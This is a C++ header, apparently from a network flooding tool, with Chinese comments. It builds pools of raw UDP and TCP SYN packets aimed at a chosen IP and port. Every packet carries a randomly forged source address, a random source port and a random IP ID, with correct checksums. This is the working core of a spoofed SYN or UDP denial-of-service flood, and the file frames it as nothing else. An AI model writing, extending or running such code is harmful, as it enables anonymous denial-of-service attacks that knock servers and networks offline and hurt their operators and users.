#pragma once
#include <cstdint>
#include <cstring>
#include <vector>
#include <cstdlib>
#include <time.h>

#pragma pack(push, 1)
struct IpHeader { uint8_t ihl : 4, version : 4; uint8_t tos; uint16_t tot_len; uint16_t id; uint16_t frag_off; uint8_t ttl; uint8_t protocol; uint16_t check; uint32_t saddr; uint32_t daddr; };
struct UdpHeader { uint16_t source; uint16_t dest; uint16_t len; uint16_t check; };
struct TcpHeader { uint16_t source; uint16_t dest; uint32_t seq; uint32_t ack_seq; uint16_t res1 : 4, doff : 4, fin : 1, syn : 1, rst : 1, psh : 1, ack : 1, urg : 1, ece : 1, cwr : 1; uint16_t window; uint16_t check; uint16_t urg_ptr; };
#pragma pack(pop)

inline uint32_t xor_rand(uint32_t& state) {
    state ^= state << 13; state ^= state >> 17; state ^= state << 5; return state;
}

class PacketBuilder {
public:
    static std::vector<std::vector<uint8_t>> PreGeneratePools(
        uint32_t dst_ip, uint16_t dst_port, int mode, int count = 1024) 
    {
        std::vector<std::vector<uint8_t>> pool(count);
        uint32_t rng_state = (uint32_t)time(nullptr);
        
        for (int i = 0; i < count; ++i) {
            if (mode == 0) pool[i] = BuildUdp(dst_ip, dst_port, rng_state);
            else pool[i] = BuildTcpSyn(dst_ip, dst_port, rng_state);
        }
        return pool;
    }

private:
    // 注意：去掉了 EthHeader，直接从 IP 头开始构建
    static std::vector<uint8_t> BuildUdp(uint32_t dst_ip, uint16_t dst_port, uint32_t& rng_state) {
        std::vector<uint8_t> buf(20 + 8); // 20字节IP头 + 8字节UDP头
        IpHeader* ip = (IpHeader*)buf.data();
        UdpHeader* udp = (UdpHeader*)(buf.data() + 20);

        ip->version = 4; ip->ihl = 5; ip->tos = 0; ip->tot_len = htons(28);
        ip->id = htons((uint16_t)xor_rand(rng_state)); ip->frag_off = 0; ip->ttl = 64;
        ip->protocol = 17; ip->saddr = xor_rand(rng_state); ip->daddr = dst_ip;
        ip->check = 0; ip->check = Checksum((uint16_t*)ip, 20);
        
        udp->source = htons((uint16_t)xor_rand(rng_state)); udp->dest = htons(dst_port);
        udp->len = htons(8); udp->check = 0;
        return buf;
    }

    static std::vector<uint8_t> BuildTcpSyn(uint32_t dst_ip, uint16_t dst_port, uint32_t& rng_state) {
        std::vector<uint8_t> buf(20 + 20); // 20字节IP头 + 20字节TCP头
        IpHeader* ip = (IpHeader*)buf.data();
        TcpHeader* tcp = (TcpHeader*)(buf.data() + 20);

        ip->version = 4; ip->ihl = 5; ip->tot_len = htons(40);
        ip->id = htons((uint16_t)xor_rand(rng_state)); ip->ttl = 64; ip->protocol = 6;
        ip->saddr = xor_rand(rng_state); ip->daddr = dst_ip;
        ip->check = 0; ip->check = Checksum((uint16_t*)ip, 20);
        
        tcp->source = htons((uint16_t)xor_rand(rng_state)); tcp->dest = htons(dst_port);
        tcp->seq = xor_rand(rng_state); tcp->doff = 5; tcp->syn = 1; tcp->window = htons(65535);
        tcp->check = 0; tcp->check = TcpChecksum(ip, tcp);
        return buf;
    }

    static uint16_t Checksum(uint16_t* buf, int len) {
        unsigned long sum = 0; while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(uint8_t*)buf;
        sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16);
        return (uint16_t)(~sum);
    }

    static uint16_t TcpChecksum(IpHeader* ip, TcpHeader* tcp) {
        unsigned long sum = 0;
        sum += (ip->saddr >> 16) & 0xFFFF; sum += ip->saddr & 0xFFFF;
        sum += (ip->daddr >> 16) & 0xFFFF; sum += ip->daddr & 0xFFFF;
        sum += htons(ip->protocol); sum += htons(20);
        uint16_t* ptr = (uint16_t*)tcp; for (int i = 0; i < 10; i++) sum += ptr[i];
        sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16);
        return (uint16_t)(~sum);
    }
};
